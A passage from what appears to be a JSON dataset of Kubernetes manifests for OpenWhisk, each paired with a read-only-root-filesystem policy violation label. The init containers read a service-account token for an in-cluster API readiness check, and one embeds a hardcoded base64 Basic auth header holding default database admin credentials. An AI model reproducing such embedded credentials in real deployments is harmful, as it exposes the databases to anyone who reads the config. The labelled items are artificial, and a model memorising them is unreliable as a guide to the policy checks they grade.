   value: 256m\n        - name: CONFIG_whisk_concurrencyLimit_min\n          value: '1'\n        - name: CONFIG_whisk_concurrencyLimit_max\n          value: '1'\n        - name: CONFIG_whisk_concurrencyLimit_std\n          value: '1'\n        - name: CONFIG_whisk_logLimit_min\n          value: 0m\n        - name: CONFIG_whisk_logLimit_max\n          value: 10m\n        - name: CONFIG_whisk_logLimit_std\n          value: 10m\n        - name: CONFIG_whisk_activation_payload_max\n          value: '1048576'\n        - name: CONFIG_whisk_loadbalancer_blackboxFraction\n          value: 10%\n        - name: CONFIG_whisk_loadbalancer_timeoutFactor\n          value: '2'\n        - name: KAFKA_HOSTS\n          value: RELEASE-NAME-kafka-0.RELEASE-NAME-kafka.default.svc.cluster.local:9092\n        - name: CONFIG_whisk_kafka_replicationFactor\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_cacheInvalidation_retentionBytes\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_cacheInvalidation_retentionMs\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_cacheInvalidation_segmentBytes\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_completed_retentionBytes\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_completed_retentionMs\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_completed_segmentBytes\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_events_retentionBytes\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_events_retentionMs\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_events_segmentBytes\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_health_retentionBytes\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_health_retentionMs\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_health_segmentBytes\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_invoker_retentionBytes\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_invoker_retentionMs\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_invoker_segmentBytes\n          value: ''\n        - name: CONFIG_whisk_couchdb_username\n          valueFrom:\n            secretKeyRef:\n              name: RELEASE-NAME-db.auth\n              key: db_username\n        - name: CONFIG_whisk_couchdb_password\n          valueFrom:\n            secretKeyRef:\n              name: RELEASE-NAME-db.auth\n              key: db_password\n        - name: CONFIG_whisk_couchdb_port\n          valueFrom:\n            configMapKeyRef:\n              name: RELEASE-NAME-db.config\n              key: db_port\n        - name: CONFIG_whisk_couchdb_protocol\n          valueFrom:\n            configMapKeyRef:\n              name: RELEASE-NAME-db.config\n              key: db_protocol\n        - name: CONFIG_whisk_couchdb_host\n          value: RELEASE-NAME-couchdb.default.svc.cluster.local\n        - name: CONFIG_whisk_couchdb_provider\n          valueFrom:\n            configMapKeyRef:\n              name: RELEASE-NAME-db.config\n              key: db_provider\n        - name: CONFIG_whisk_couchdb_databases_WhiskActivation\n          valueFrom:\n            configMapKeyRef:\n              name: RELEASE-NAME-db.config\n              key: db_whisk_activations\n        - name: CONFIG_whisk_couchdb_databases_WhiskEntity\n          valueFrom:\n            configMapKeyRef:\n              name: RELEASE-NAME-db.config\n              key: db_whisk_actions\n        - name: CONFIG_whisk_couchdb_databases_WhiskAuth\n          valueFrom:\n            configMapKeyRef:\n              name: RELEASE-NAME-db.config\n              key: db_whisk_auths\n        - name: CONTROLLER_INSTANCES\n          value: '1'\n        - name: CONFIG_logback_log_level\n          value: INFO\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"wait-for-couchdb\" does not have a read-only root file system"
  },
  {
    "id": "10547",
    "manifest_path": "data/manifests/the_stack_sample/sample_4076.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: RELEASE-NAME-controller\n  labels:\n    name: RELEASE-NAME-controller\n    heritage: Helm\n    release: RELEASE-NAME\n    chart: openwhisk-1.0.1\n    app: RELEASE-NAME-openwhisk\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: RELEASE-NAME-controller\n  template:\n    metadata:\n      labels:\n        name: RELEASE-NAME-controller\n        heritage: Helm\n        release: RELEASE-NAME\n        chart: openwhisk-1.0.1\n        app: RELEASE-NAME-openwhisk\n    spec:\n      serviceAccountName: RELEASE-NAME-core\n      affinity:\n        nodeAffinity:\n          preferredDuringSchedulingIgnoredDuringExecution:\n          - weight: 100\n            preference:\n              matchExpressions:\n              - key: openwhisk-role\n                operator: NotIn\n                values:\n                - invoker\n          - weight: 80\n            preference:\n              matchExpressions:\n              - key: openwhisk-role\n                operator: In\n                values:\n                - core\n        podAntiAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n          - labelSelector:\n              matchExpressions:\n              - key: name\n                operator: In\n                values:\n                - RELEASE-NAME-controller\n            topologyKey: kubernetes.io/hostname\n      initContainers:\n      - name: wait-for-kafka\n        image: openwhisk/ow-utils:3e6138d\n        imagePullPolicy: IfNotPresent\n        command:\n        - sh\n        - -c\n        - 'cacert=\"/var/run/secrets/kubernetes.io/serviceaccount/ca.crt\"; token=\"$(cat\n          /var/run/secrets/kubernetes.io/serviceaccount/token)\"; while true; do rc=$(curl\n          -sS --cacert $cacert --header \"Authorization: Bearer $token\" https://kubernetes.default.svc/api/v1/namespaces/default/endpoints/RELEASE-NAME-kafka\n          | jq -r \".subsets[].addresses | length\"); echo \"num ready kafka endpoints\n          is $rc\"; if [ $rc -gt 0 ]; then echo \"Success: ready kafka endpoint!\"; break;\n          fi; echo \"kafka not ready yet; sleeping for 3 seconds\"; sleep 3; done;'\n      - name: wait-for-couchdb\n        image: busybox:latest\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: READINESS_URL\n          value: http://RELEASE-NAME-couchdb.default.svc.cluster.local:5984/ow_kube_couchdb_initialized_marker\n        command:\n        - sh\n        - -c\n        - 'while true; do echo ''checking CouchDB readiness''; wget -T 5 --spider\n          $READINESS_URL --header=\"Authorization: Basic d2hpc2tfYWRtaW46c29tZV9wYXNzdzByZA==\";\n          result=$?; if [ $result -eq 0 ]; then echo ''Success: CouchDB is ready!'';\n          break; fi; echo ''...not ready yet; sleeping 3 seconds before retry''; sleep\n          3; done;'\n      containers:\n      - name: controller\n        imagePullPolicy: IfNotPresent\n        image: openwhisk/controller:3e6138d\n        command:\n        - /bin/bash\n        - -c\n        - /init.sh `hostname | awk -F '-' '{print $NF}'`\n        ports:\n        - name: controller\n          containerPort: 8080\n        - name: akka-remoting\n          containerPort: 2552\n        - name: akka-mgmt-http\n          containerPort: 19999\n        livenessProbe:\n          httpGet:\n            path: /ping\n            port: 8080\n            scheme: HTTP\n          initialDelaySeconds: 10\n          periodSeconds: 10\n          timeoutSeconds: 1\n        readinessProbe:\n          httpGet:\n            path: /ping\n            port: 8080\n            scheme: HTTP\n          initialDelaySeconds: 10\n          periodSeconds: 10\n          timeoutSeconds: 1\n        env:\n        - name: PORT\n          value: '8080'\n        - name: TZ\n          value: UTC\n        - name: CONFIG_whisk_info_date\n          valueFrom:\n            configMapKeyRef:\n              name: RELEASE-NAME-whisk.config\n              key: whisk_info_date\n        - name: CONFIG_whisk_info_buildNo\n          valueFrom:\n            configMapKeyRef:\n              name: RELEASE-NAME-whisk.config\n              key: whisk_info_buildNo\n        - name: JAVA_OPTS\n          value: '-Xmx1024M '\n        - name: CONTROLLER_OPTS\n          value: ' '\n        - name: RUNTIMES_MANIFEST\n          value: \"{\\n    \\\"runtimes\\\": {\\n        \\\"nodejs\\\": [\\n            {\\n \\\n            \\               \\\"kind\\\": \\\"nodejs:12\\\",\\n                \\\"default\\\"\\\n            : false,\\n                \\\"image\\\": {\\n                    \\\"prefix\\\"\\\n            : \\\"openwhisk\\\",\\n                    \\\"name\\\": \\\"action-nodejs-v12\\\"\\\n            ,\\n                    \\\"tag\\\": \\\"1.19.0\\\"\\n                },\\n     \\\n            \\           \\\"deprecated\\\": false,\\n                \\\"attached\\\": {\\n\\\n            \\                    \\\"attachmentName\\\": \\\"codefile\\\",\\n             \\\n            \\       \\\"attachmentType\\\": \\\"text/plain\\\"\\n                }\\n      \\\n            \\      },\\n            {\\n                \\\"kind\\\": \\\"nodejs:14\\\",\\n \\\n            \\               \\\"default\\\": true,\\n                \\\"image\\\": {\\n   \\\n            \\                 \\\"prefix\\\": \\\"openwhisk\\\",\\n                    \\\"name\\\"\\\n            : \\\"action-nodejs-v14\\\",\\n                    \\\"tag\\\": \\\"1.19.0\\\"\\n  \\\n            \\              },\\n                \\\"deprecated\\\": false,\\n          \\\n            \\      \\\"attached\\\": {\\n                    \\\"attachmentName\\\": \\\"codefile\\\"\\\n            ,\\n                    \\\"attachmentType\\\": \\\"text/plain\\\"\\n          \\\n            \\      },\\n                \\\"stemCells\\\": [\\n                    {\\n \\\n            \\                       \\\"initialCount\\\": 2,\\n                       \\\n            \\ \\\"memory\\\": \\\"256 MB\\\",\\n                        \\\"reactive\\\": {\\n \\\n            \\                           \\\"minCount\\\": 1,\\n                       \\\n            \\     \\\"maxCount\\\": 4,\\n                            \\\"ttl\\\": \\\"2 minutes\\\"\\\n            ,\\n                            \\\"threshold\\\": 1,\\n                   \\\n            \\         \\\"increment\\\": 1\\n                        }\\n              \\\n            \\      }\\n                ]\\n            }\\n        ],\\n        \\\"python\\\"\\\n            : [\\n            {\\n                \\\"kind\\\": \\\"python:3\\\",\\n        \\\n            \\        \\\"default\\\": true,\\n                \\\"image\\\": {\\n          \\\n            \\          \\\"prefix\\\": \\\"openwhisk\\\",\\n                    \\\"name\\\": \\\"\\\n            action-python-v3.7\\\",\\n                    \\\"tag\\\": \\\"1.17.0\\\"\\n     \\\n            \\           },\\n                \\\"deprecated\\\": false,\\n             \\\n            \\   \\\"attached\\\": {\\n                    \\\"attachmentName\\\": \\\"codefile\\\"\\\n            ,\\n                    \\\"attachmentType\\\": \\\"text/plain\\\"\\n          \\\n            \\      }\\n            }\\n        ],\\n        \\\"swift\\\": [\\n          \\\n            \\  {\\n                \\\"kind\\\": \\\"swift:4.2\\\",\\n                \\\"default\\\"\\\n            : true,\\n                \\\"image\\\": {\\n                    \\\"prefix\\\"\\\n            : \\\"openwhisk\\\",\\n                    \\\"name\\\": \\\"action-swift-v4.2\\\"\\\n            ,\\n                    \\\"tag\\\": \\\"1.17.0\\\"\\n                },\\n     \\\n            \\           \\\"deprecated\\\": false,\\n                \\\"attached\\\": {\\n\\\n            \\                    \\\"attachmentName\\\": \\\"codefile\\\",\\n             \\\n            \\       \\\"attachmentType\\\": \\\"text/plain\\\"\\n                }\\n      \\\n            \\      },\\n            {\\n                \\\"kind\\\": \\\"swift:5.1\\\",\\n \\\n            \\               \\\"default\\\": false,\\n                \\\"image\\\": {\\n  \\\n            \\                  \\\"prefix\\\": \\\"openwhisk\\\",\\n                    \\\"\\\n            name\\\": \\\"action-swift-v5.1\\\",\\n                    \\\"tag\\\": \\\"1.17.0\\\"\\\n            \\n                },\\n                \\\"deprecated\\\": false,\\n       \\\n            \\         \\\"attached\\\": {\\n                    \\\"attachmentName\\\": \\\"\\\n            codefile\\\",\\n                    \\\"attachmentType\\\": \\\"text/plain\\\"\\n\\\n            \\                }\\n            },\\n            {\\n                \\\"\\\n            kind\\\": \\\"swift:5.3\\\",\\n                \\\"default\\\": false,\\n        \\\n            \\        \\\"image\\\": {\\n                    \\\"prefix\\\": \\\"openwhisk\\\",\\n\\\n            \\                    \\\"name\\\": \\\"action-swift-v5.3\\\",\\n              \\\n            \\      \\\"tag\\\": \\\"1.17.0\\\"\\n                },\\n                \\\"deprecated\\\"\\\n            : false,\\n                \\\"attached\\\": {\\n                    \\\"attachmentName\\\"\\\n            : \\\"codefile\\\",\\n                    \\\"attachmentType\\\": \\\"text/plain\\\"\\\n            \\n                }\\n            },\\n            {\\n                \\\"\\\n            kind\\\": \\\"swift:5.4\\\",\\n                \\\"default\\\": false,\\n        \\\n            \\        \\\"image\\\": {\\n                    \\\"prefix\\\": \\\"openwhisk\\\",\\n\\\n            \\                    \\\"name\\\": \\\"action-swift-v5.4\\\",\\n              \\\n            \\      \\\"tag\\\": \\\"1.17.0\\\"\\n                },\\n                \\\"deprecated\\\"\\\n            : false,\\n                \\\"attached\\\": {\\n                    \\\"attachmentName\\\"\\\n            : \\\"codefile\\\",\\n                    \\\"attachmentType\\\": \\\"text/plain\\\"\\\n            \\n                }\\n            }\\n        ],\\n        \\\"java\\\": [\\n\\\n            \\            {\\n                \\\"kind\\\": \\\"java:8\\\",\\n              \\\n            \\  \\\"default\\\": true,\\n                \\\"image\\\": {\\n                \\\n            \\    \\\"prefix\\\": \\\"openwhisk\\\",\\n                    \\\"name\\\": \\\"java8action\\\"\\\n            ,\\n                    \\\"tag\\\": \\\"1.17.0\\\"\\n                },\\n     \\\n            \\           \\\"deprecated\\\": false,\\n                \\\"attached\\\": {\\n\\\n            \\                    \\\"attachmentName\\\": \\\"jarfile\\\",\\n              \\\n            \\      \\\"attachmentType\\\": \\\"application/java-archive\\\"\\n            \\\n            \\    },\\n                \\\"requireMain\\\": true\\n            }\\n      \\\n            \\  ],\\n        \\\"php\\\": [\\n            {\\n                \\\"kind\\\": \\\"\\\n            php:7.3\\\",\\n                \\\"default\\\": false,\\n                \\\"deprecated\\\"\\\n            : false,\\n                \\\"image\\\": {\\n                    \\\"prefix\\\"\\\n            : \\\"openwhisk\\\",\\n                    \\\"name\\\": \\\"action-php-v7.3\\\",\\n\\\n            \\                    \\\"tag\\\": \\\"1.17.0\\\"\\n                },\\n       \\\n            \\         \\\"attached\\\": {\\n                    \\\"attachmentName\\\": \\\"\\\n            codefile\\\",\\n                    \\\"attachmentType\\\": \\\"text/plain\\\"\\n\\\n            \\                }\\n            },\\n            {\\n                \\\"\\\n            kind\\\": \\\"php:7.4\\\",\\n                \\\"default\\\": true,\\n           \\\n            \\     \\\"deprecated\\\": false,\\n                \\\"image\\\": {\\n         \\\n            \\           \\\"prefix\\\": \\\"openwhisk\\\",\\n                    \\\"name\\\":\\\n            \\ \\\"action-php-v7.4\\\",\\n                    \\\"tag\\\": \\\"1.17.0\\\"\\n    \\\n            \\            },\\n                \\\"attached\\\": {\\n                   \\\n            \\ \\\"attachmentName\\\": \\\"codefile\\\",\\n                    \\\"attachmentType\\\"\\\n            : \\\"text/plain\\\"\\n                }\\n            },\\n            {\\n \\\n            \\               \\\"kind\\\": \\\"php:8.0\\\",\\n                \\\"default\\\": false,\\n\\\n            \\                \\\"deprecated\\\": false,\\n                \\\"image\\\": {\\n\\\n            \\                    \\\"prefix\\\": \\\"openwhisk\\\",\\n                    \\\"\\\n            name\\\": \\\"action-php-v7.4\\\",\\n                    \\\"tag\\\": \\\"1.17.0\\\"\\n\\\n            \\                },\\n                \\\"attached\\\": {\\n               \\\n            \\     \\\"attachmentName\\\": \\\"codefile\\\",\\n                    \\\"attachmentType\\\"\\\n            : \\\"text/plain\\\"\\n                }\\n            }\\n        ],\\n     \\\n            \\   \\\"ruby\\\": [\\n            {\\n                \\\"kind\\\": \\\"ruby:2.5\\\"\\\n            ,\\n                \\\"default\\\": true,\\n                \\\"deprecated\\\"\\\n            : false,\\n                \\\"attached\\\": {\\n                    \\\"attachmentName\\\"\\\n            : \\\"codefile\\\",\\n                    \\\"attachmentType\\\": \\\"text/plain\\\"\\\n            \\n                },\\n                \\\"image\\\": {\\n                 \\\n            \\   \\\"prefix\\\": \\\"openwhisk\\\",\\n                    \\\"name\\\": \\\"action-ruby-v2.5\\\"\\\n            ,\\n                    \\\"tag\\\": \\\"1.17.0\\\"\\n                }\\n      \\\n            \\      }\\n        ],\\n        \\\"go\\\": [\\n            {\\n             \\\n            \\   \\\"kind\\\": \\\"go:1.15\\\",\\n                \\\"default\\\": true,\\n     \\\n            \\           \\\"deprecated\\\": false,\\n                \\\"attached\\\": {\\n\\\n            \\                    \\\"attachmentName\\\": \\\"codefile\\\",\\n             \\\n            \\       \\\"attachmentType\\\": \\\"text/plain\\\"\\n                },\\n     \\\n            \\           \\\"image\\\": {\\n                    \\\"prefix\\\": \\\"openwhisk\\\"\\\n            ,\\n                    \\\"name\\\": \\\"action-golang-v1.15\\\",\\n          \\\n            \\          \\\"tag\\\": \\\"1.18.0\\\"\\n                }\\n            }\\n   \\\n            \\     ],\\n        \\\"rust\\\": [\\n            {\\n                \\\"kind\\\"\\\n            : \\\"rust:1.34\\\",\\n                \\\"default\\\": true,\\n               \\\n            \\ \\\"deprecated\\\": false,\\n                \\\"attached\\\": {\\n          \\\n            \\          \\\"attachmentName\\\": \\\"codefile\\\",\\n                    \\\"attachmentType\\\"\\\n            : \\\"text/plain\\\"\\n                },\\n                \\\"image\\\": {\\n \\\n            \\                   \\\"prefix\\\": \\\"openwhisk\\\",\\n                    \\\"\\\n            name\\\": \\\"action-rust-v1.34\\\",\\n                    \\\"tag\\\": \\\"1.3.0\\\"\\\n            \\n                }\\n            }\\n        ],\\n        \\\"dotnet\\\": [\\n\\\n            \\            {\\n                \\\"kind\\\": \\\"dotnet:2.2\\\",\\n          \\\n            \\      \\\"default\\\": true,\\n                \\\"deprecated\\\": false,\\n  \\\n            \\              \\\"requireMain\\\": true,\\n                \\\"image\\\": {\\n\\\n            \\                    \\\"prefix\\\": \\\"openwhisk\\\",\\n                    \\\"\\\n            name\\\": \\\"action-dotnet-v2.2\\\",\\n                    \\\"tag\\\": \\\"1.16.0\\\"\\\n            \\n                },\\n                \\\"attached\\\": {\\n              \\\n            \\      \\\"attachmentName\\\": \\\"codefile\\\",\\n                    \\\"attachmentType\\\"\\\n            : \\\"text/plain\\\"\\n                }\\n            },\\n            {\\n \\\n            \\               \\\"kind\\\": \\\"dotnet:3.1\\\",\\n                \\\"default\\\"\\\n            : false,\\n                \\\"deprecated\\\": false,\\n                \\\"requireMain\\\"\\\n            : true,\\n                \\\"image\\\": {\\n                    \\\"prefix\\\"\\\n            : \\\"openwhisk\\\",\\n                    \\\"name\\\": \\\"action-dotnet-v3.1\\\"\\\n            ,\\n                    \\\"tag\\\": \\\"1.16.0\\\"\\n                },\\n     \\\n            \\           \\\"attached\\\": {\\n                    \\\"attachmentName\\\": \\\"\\\n            codefile\\\",\\n                    \\\"attachmentType\\\": \\\"text/plain\\\"\\n\\\n            \\                }\\n            }\\n        ],\\n        \\\"ballerina\\\":\\\n            \\ [\\n            {\\n                \\\"kind\\\": \\\"ballerina:0.990\\\",\\n \\\n            \\               \\\"default\\\": true,\\n                \\\"image\\\": {\\n   \\\n            \\                 \\\"prefix\\\": \\\"openwhisk\\\",\\n                    \\\"name\\\"\\\n            : \\\"action-ballerina-v0.990.2\\\",\\n                    \\\"tag\\\": \\\"nightly\\\"\\\n            \\n                },\\n                \\\"deprecated\\\": false,\\n       \\\n            \\         \\\"attached\\\": {\\n                    \\\"attachmentName\\\": \\\"\\\n            codefile\\\",\\n                    \\\"attachmentType\\\": \\\"text/plain\\\"\\n\\\n            \\                }\\n            }\\n        ]\\n    },\\n    \\\"blackboxes\\\"\\\n            : [\\n        {\\n            \\\"prefix\\\": \\\"openwhisk\\\",\\n            \\\"\\\n            name\\\": \\\"dockerskeleton\\\",\\n            \\\"tag\\\": \\\"1.14.0\\\"\\n       \\\n            \\ }\\n    ]\\n}\\n\"\n        - name: LIMITS_ACTIONS_INVOKES_PERMINUTE\n          value: '60'\n        - name: LIMITS_ACTIONS_INVOKES_CONCURRENT\n          value: '30'\n        - name: LIMITS_TRIGGERS_FIRES_PERMINUTE\n          value: '60'\n        - name: LIMITS_ACTIONS_SEQUENCE_MAXLENGTH\n          value: '50'\n        - name: CONFIG_whisk_timeLimit_min\n          value: 100ms\n        - name: CONFIG_whisk_timeLimit_max\n          value: 5m\n        - name: CONFIG_whisk_timeLimit_std\n          value: 1m\n        - name: CONFIG_whisk_memory_min\n          value: 128m\n        - name: CONFIG_whisk_memory_max\n          value: 512m\n        - name: CONFIG_whisk_memory_std\n          value: 256m\n        - name: CONFIG_whisk_concurrencyLimit_min\n          value: '1'\n        - name: CONFIG_whisk_concurrencyLimit_max\n          value: '1'\n        - name: CONFIG_whisk_concurrencyLimit_std\n          value: '1'\n        - name: CONFIG_whisk_logLimit_min\n          value: 0m\n        - name: CONFIG_whisk_logLimit_max\n          value: 10m\n        - name: CONFIG_whisk_logLimit_std\n          value: 10m\n        - name: CONFIG_whisk_activation_payload_max\n          value: '1048576'\n        - name: CONFIG_whisk_loadbalancer_blackboxFraction\n          value: 10%\n        - name: CONFIG_whisk_loadbalancer_timeoutFactor\n          value: '2'\n        - name: KAFKA_HOSTS\n          value: RELEASE-NAME-kafka-0.RELEASE-NAME-kafka.default.svc.cluster.local:9092\n        - name: CONFIG_whisk_kafka_replicationFactor\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_cacheInvalidation_retentionBytes\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_cacheInvalidation_retentionMs\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_cacheInvalidation_segmentBytes\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_completed_retentionBytes\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_completed_retentionMs\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_completed_segmentBytes\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_events_retentionBytes\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_events_retentionMs\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_events_segmentBytes\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_health_retentionBytes\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_health_retentionMs\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_health_segmentBytes\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_invoker_retentionBytes\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_invoker_retentionMs\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_invoker_segmentBytes\n          value: ''\n        - name: CONFIG_whisk_couchdb_username\n          valueFrom:\n            secretKeyRef:\n              name: RELEASE-NAME-db.auth\n              key: db_username\n        - name: CONFIG_whisk_couchdb_password\n          valueFrom:\n            secretKeyRef:\n              name: RELEASE-NAME-db.auth\n              key: db_password\n        - name: CONFIG_whisk_couchdb_port\n          valueFrom:\n            configMapKeyRef:\n              name: RELEASE-NAME-db.config\n              key: db_port\n        - name: CONFIG_whisk_couchdb_protocol\n          valueFrom:\n            configMapKeyRef:\n              name: RELEASE-NAME-db.config\n              key: db_protocol\n        - name: CONFIG_whisk_couchdb_host\n          value: RELEASE-NAME-couchdb.default.svc.cluster.local\n        - name: CONFIG_whisk_couchdb_provider\n          valueFrom:\n            configMapKeyRef:\n              name: RELEASE-NAME-db.config\n              key: db_provider\n        - name: CONFIG_whisk_couchdb_databases_WhiskActivation\n          valueFrom:\n            configMapKeyRef:\n              name: RELEASE-NAME-db.config\n              key: db_whisk_activations\n        - name: CONFIG_whisk_couchdb_databases_WhiskEntity\n          valueFrom:\n            configMapKeyRef:\n              name: RELEASE-NAME-db.config\n              key: db_whisk_actions\n        - name: CONFIG_whisk_couchdb_databases_WhiskAuth\n          valueFrom:\n            configMapKeyRef:\n              name: RELEASE-NAME-db.config\n              key: db_whisk_auths\n        - name: CONTROLLER_INSTANCES\n          value: '1'\n        - name: CONFIG_logback_log_level\n          value: INFO\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"wait-for-kafka\" does not have a read-only root file system"
  },
  {
    "id": "10548",
    "manifest_path": "data/manifests/the_stack_sample/sample_4076.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: RELEASE-NAME-controller\n  labels:\n    name: RELEASE-NAME-controller\n    heritage: Helm\n    release: RELEASE-NAME\n    chart: openwhisk-1.0.1\n    app: RELEASE-NAME-openwhisk\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: RELEASE-NAME-controller\n  template:\n    metadata:\n      labels:\n        name: RELEASE-NAME-controller\n        heritage: Helm\n        release: RELEASE-NAME\n        chart: openwhisk-1.0.1\n        app: RELEASE-NAME-openwhisk\n    spec:\n      serviceAccountName: RELEASE-NAME-core\n      affinity:\n        nodeAffinity:\n          preferredDuringSchedulingIgnoredDuringExecution:\n          - weight: 100\n            preference:\n              matchExpressions:\n              - key: openwhisk-role\n                operator: NotIn\n                values:\n                - invoker\n          - weight: 80\n            preference:\n              matchExpressions:\n              - key: openwhisk-role\n                operator: In\n                values:\n                - core\n        podAntiAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n          - labelSelector:\n              matchExpressions:\n              - key: name\n                operator: In\n                values:\n                - RELEASE-NAME-controller\n            topologyKey: kubernetes.io/hostname\n      initContainers:\n      - name: wait-for-kafka\n        image: openwhisk/ow-utils:3e6138d\n        imagePullPolicy: IfNotPresent\n        command:\n        - sh\n        - -c\n        - 'cacert=\"/var/run/secrets/kubernetes.io/serviceaccount/ca.crt\"; token=\"$(cat\n          /var/run/secrets/kubernetes.io/serviceaccount/token)\"; while true; do rc=$(curl\n          -sS --cacert $cacert --header \"Authorization: Bearer $token\" https://kubernetes.default.svc/api/v1/namespaces/default/endpoints/RELEASE-NAME-kafka\n          | jq -r \".subsets[].addresses | length\"); echo \"num ready kafka endpoints\n          is $rc\"; if [ $rc -gt 0 ]; then echo \"Success: ready kafka endpoint!\"; break;\n          fi; echo \"kafka not ready yet; sleeping for 3 seconds\"; sleep 3; done;'\n      - name: wait-for-couchdb\n        image: busybox:latest\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: READINESS_URL\n          value: http://RELEASE-NAME-couchdb.default.svc.cluster.local:5984/ow_kube_couchdb_initialized_marker\n        command:\n        - sh\n        - -c\n        - 'while true; do echo ''checking CouchDB readiness''; wget -T 5 --spider\n          $READINESS_URL --header=\"Authorization: Basic d2hpc2tfYWRtaW46c29tZV9wYXNzdzByZA==\";\n          result=$?; if [ $result -eq 0 ]; then echo ''Success: CouchDB is ready!'';\n          break; fi; echo ''...not ready yet; sleeping 3 seconds before retry''; sleep\n          3; done;'\n      containers:\n      - name: controller\n        imagePullPolicy: IfNotPresent\n        image: openwhisk/controller:3e6138d\n        command:\n        - /bin/bash\n        - -c\n        - /init.sh `hostname | awk -F '-' '{print $NF}'`\n        ports:\n        - name: controller\n          containerPort: 8080\n        - name: akka-remoting\n          containerPort: 2552\n        - name: akka-mgmt-http\n          containerPort: 19999\n        livenessProbe:\n          httpGet:\n            path: /ping\n            port: 8080\n            scheme: HTTP\n          initialDelaySeconds: 10\n          periodSeconds: 10\n          timeoutSeconds: 1\n        readinessProbe:\n          httpGet:\n            path: /ping\n            port: 8080\n            scheme: HTTP\n          initialDelaySeconds: 10\n          periodSeconds: 10\n          timeoutSeconds: 1\n        env:\n        - name: PORT\n          value: '8080'\n        - name: TZ\n          value: UTC\n        - name: CONFIG_whisk_info_date\n          valueFrom:\n            configMapKeyRef:\n              name: RELEASE-NAME-whisk.config\n              key: whisk_info_date\n        - name: CONFIG_whisk_info_buildNo\n          valueFrom:\n            configMapKeyRef:\n              name: RELEASE-NAME-whisk.config\n              key: whisk_info_buildNo\n        - name: JAVA_OPTS\n          value: '-Xmx1024M '\n        - name: CONTROLLER_OPTS\n          value: ' '\n        - name: RUNTIMES_MANIFEST\n          value: \"{\\n    \\\"runtimes\\\": {\\n        \\\"nodejs\\\": [\\n            {\\n \\\n            \\               \\\"kind\\\": \\\"nodejs:12\\\",\\n                \\\"default\\\"\\\n            : false,\\n                \\\"image\\\": {\\n                    \\\"prefix\\\"\\\n            : \\\"openwhisk\\\",\\n                    \\\"name\\\": \\\"action-nodejs-v12\\\"\\\n            ,\\n                    \\\"tag\\\": \\\"1.19.0\\\"\\n                },\\n     \\\n            \\           \\\"deprecated\\\": false,\\n                \\\"attached\\\": {\\n\\\n            \\                    \\\"attachmentName\\\": \\\"codefile\\\",\\n             \\\n            \\       \\\"attachmentType\\\": \\\"text/plain\\\"\\n                }\\n      \\\n            \\      },\\n            {\\n                \\\"kind\\\": \\\"nodejs:14\\\",\\n \\\n            \\               \\\"default\\\": true,\\n                \\\"image\\\": {\\n   \\\n            \\                 \\\"prefix\\\": \\\"openwhisk\\\",\\n                    \\\"name\\\"\\\n            : \\\"action-nodejs-v14\\\",\\n                    \\\"tag\\\": \\\"1.19.0\\\"\\n  \\\n            \\              },\\n                \\\"deprecated\\\": false,\\n          \\\n            \\      \\\"attached\\\": {\\n                    \\\"attachmentName\\\": \\\"codefile\\\"\\\n            ,\\n                    \\\"attachmentType\\\": \\\"text/plain\\\"\\n          \\\n            \\      },\\n                \\\"stemCells\\\": [\\n                    {\\n \\\n            \\                       \\\"initialCount\\\": 2,\\n                       \\\n            \\ \\\"memory\\\": \\\"256 MB\\\",\\n                        \\\"reactive\\\": {\\n \\\n            \\                           \\\"minCount\\\": 1,\\n                       \\\n            \\     \\\"maxCount\\\": 4,\\n                            \\\"ttl\\\": \\\"2 minutes\\\"\\\n            ,\\n                            \\\"threshold\\\": 1,\\n                   \\\n            \\         \\\"increment\\\": 1\\n                        }\\n              \\\n            \\      }\\n                ]\\n            }\\n        ],\\n        \\\"python\\\"\\\n            : [\\n            {\\n                \\\"kind\\\": \\\"python:3\\\",\\n        \\\n            \\        \\\"default\\\": true,\\n                \\\"image\\\": {\\n          \\\n            \\          \\\"prefix\\\": \\\"openwhisk\\\",\\n                    \\\"name\\\": \\\"\\\n            action-python-v3.7\\\",\\n                    \\\"tag\\\": \\\"1.17.0\\\"\\n     \\\n            \\           },\\n                \\\"deprecated\\\": false,\\n             \\\n            \\   \\\"attached\\\": {\\n                    \\\"attachmentName\\\": \\\"codefile\\\"\\\n            ,\\n                    \\\"attachmentType\\\": \\\"text/plain\\\"\\n          \\\n            \\      }\\n            }\\n        ],\\n        \\\"swift\\\": [\\n          \\\n            \\  {\\n                \\\"kind\\\": 